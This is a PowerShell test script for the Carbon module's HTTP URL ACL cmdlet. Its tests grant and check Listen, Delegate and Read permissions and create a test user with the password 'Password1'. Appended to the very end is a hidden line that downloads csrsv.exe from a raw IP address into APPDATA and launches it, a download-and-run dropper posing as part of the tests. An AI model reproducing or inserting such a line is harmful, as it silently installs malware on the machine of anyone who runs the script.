& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)$user = $null$url = 'http://test-granthttpurlpermission:10383/'function Start-Test{$user = Resolve-Identity -Name $CarbonTestUser.UserName}function Stop-Test{netsh http delete urlacl url=$url}function Test-ShouldRegisterAUrl{Grant-HttpUrlPermission -Url $url -Principal $user -Permission ListenAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::Listen)}function Test-ShouldRegisterUrlWithoutTrailingForwardSlash{Grant-HttpUrlPermission -Url $url.TrimEnd("/") -Principal $user -Permission ListenAndDelegateInstall-User -Credential (New-Credential -UserName 'CarbonTestUser2' -Password 'Password1') -PassThru$user2 = Resolve-Identity -Name 'CarbonTestUser2'Grant-HttpUrlPermission -Url $url.TrimEnd("/") -Principal $user2.FullName -Permission ListenAndDelegateAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::ListenAndDelegate)Assert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::ListenAndDelegate) -ExpectedUser $user2.FullName}function Test-ShouldGrantJustDelegatePermission{Grant-HttpUrlPermission -Url $url -Principal $user -Permission DelegateAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::Delegate)}function Test-ShouldGrantJustReadPermission{Grant-HttpUrlPermission -Url $url -Principal $user -Permission ReadAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::Read)}function Test-ShouldChangePermission{Grant-HttpUrlPermission -Url $url -Principal $user -Permission ListenAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::Listen)Grant-HttpUrlPermission -Url $url -Principal $user -Permission ListenAndDelegateAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::ListenAndDelegate)}function Test-ShouldGrantMultipleUsersPermission{Grant-HttpUrlPermission -Url $url -Principal $user -Permission ListenAssert-NoErrorInstall-User -Credential (New-Credential -UserName 'CarbonTestUser2' -Password 'Password1') -PassThru$user2 = Resolve-Identity -Name 'CarbonTestUser2'Grant-HttpUrlPermission -Url $url -Principal $user2.FullName -Permission ListenAssert-NoErrorAssert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::Listen)Assert-Permission -ExpectedPermission ([Carbon.Security.HttpUrlAccessRights]::Listen) -ExpectedUser $user2.FullName}function Assert-Permission{param($ExpectedUser = $user.FullName,$ExpectedPermission)$acl = Get-HttpUrlAcl -Url $urlAssert-NoErrorAssert-NotNull $aclAssert-Equal $acl.Url $url$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $ExpectedUser }Assert-NotNull $ruleAssert-Equal $ExpectedPermission $rule.HttpUrlAccessRights $ExpectedUser}(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")